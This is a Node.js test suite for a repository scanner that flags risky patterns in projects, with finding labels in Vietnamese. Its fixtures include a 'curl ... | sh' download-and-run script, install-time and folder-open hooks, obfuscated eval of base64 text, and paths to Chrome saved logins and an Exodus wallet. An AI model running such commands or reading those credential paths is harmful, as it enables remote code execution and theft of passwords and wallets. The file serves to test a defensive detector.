import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { scanRepo } from '../src/check-repo.js';

function repo(files) {
  const dir = mkdtempSync(join(tmpdir(), 'repo-'));
  for (const [path, content] of Object.entries(files)) {
    mkdirSync(dirname(join(dir, path)), { recursive: true });
    writeFileSync(join(dir, path), content);
  }
  return dir;
}
const labels = (dir, level) => scanRepo(dir).filter((f) => !level || f.level === level).map((f) => f.label);
const has = (dir, re, level = 'high') => labels(dir, level).some((l) => re.test(l));

test('a clean repo has no findings', () => {
  const dir = repo({
    'package.json': JSON.stringify({ scripts: { start: 'ng serve', test: 'ng test' }, dependencies: { '@angular/core': '^18.0.0' } }),
    'src/app.ts': 'export const x = 1;\n',
  });
  assert.deepEqual(scanRepo(dir), []);
});

test('install-time npm scripts are high risk', () => {
  const dir = repo({ 'package.json': JSON.stringify({ scripts: { postinstall: 'node setup.js' } }) });
  assert.ok(has(dir, /postinstall/));
});

test('a script that downloads and runs code is high risk', () => {
  const dir = repo({ 'package.json': JSON.stringify({ scripts: { dev: 'curl -s http://x.io/a.sh | sh && vite' } }) });
  assert.ok(has(dir, /tải và chạy/));
});

test('VS Code tasks that run on folder open are high risk', () => {
  const dir = repo({ '.vscode/tasks.json': '{ "tasks": [{ "command": "node x.js", "runOptions": { "runOn": "folderOpen" } }] }' });
  assert.ok(has(dir, /mở thư mục/));
});

test('dependencies from git or URLs are medium risk', () => {
  const dir = repo({ 'package.json': JSON.stringify({ dependencies: { foo: 'git+https://github.com/x/foo.git', bar: 'https://x.io/bar.tgz' } }) });
  assert.ok(has(dir, /ngoài npm/, 'medium'));
});

test('obfuscated code, eval of decoded text and secret paths are high risk', () => {
  const dir = repo({
    'server/config.js': "const _0x3fa2=['a'];eval(atob('ZG9jdW1lbnQ='));\n",
    'lib/steal.js': "const p = home + '/.config/google-chrome/Default/Login Data';\n",
  });
  assert.ok(has(dir, /làm rối/));
  assert.ok(has(dir, /eval/));
  assert.ok(has(dir, /ví|mật khẩu|SSH/));
});

test('very long lines and large base64 blobs are medium risk', () => {
  const dir = repo({
    'public/min.js': 'var a=1;'.repeat(400) + '\n',
    'src/data.js': `const b = "${'QUJD'.repeat(200)}";\n`,
  });
  assert.ok(has(dir, /dòng rất dài/, 'medium'));
  assert.ok(has(dir, /base64/, 'medium'));
});

test('node_modules and .git are skipped', () => {
  const dir = repo({ 'node_modules/x/index.js': "eval(atob('x'))\n", '.git/hooks/x.js': "eval(atob('x'))\n" });
  assert.deepEqual(scanRepo(dir), []);
});

test('findings carry file and line', () => {
  const dir = repo({ 'a/b.js': "ok\nfetch('http://45.61.1.2/p')\n" });
  const [f] = scanRepo(dir);
  assert.equal(f.file, 'a/b.js');
  assert.equal(f.line, 2);
});

test('local addresses, lockfiles and build caches are not flagged', () => {
  const dir = repo({
    'Dockerfile': 'ENV ASPNETCORE_URLS=http://0.0.0.0:8080\n# test on http://127.0.0.1:4200 or http://192.168.1.5\n',
    'package-lock.json': '{ "node_modules/@exodus/bytes": { "resolved": "https://registry.npmjs.org/@exodus/bytes/-/bytes-1.16.0.tgz" } }\n',
    '.angular/cache/x/chunk.js': 'var a=1;'.repeat(400) + '\n',
    'bin/Debug/app.js': "eval(atob('x'))\n",
    'obj/x.js': "eval(atob('x'))\n",
  });
  assert.deepEqual(scanRepo(dir), []);
});

test('the Exodus wallet folder is still flagged', () => {
  const dir = repo({ 'a.js': "const w = home + '/AppData/Roaming/Exodus/exodus.wallet';\n" });
  assert.ok(has(dir, /ví/));
});
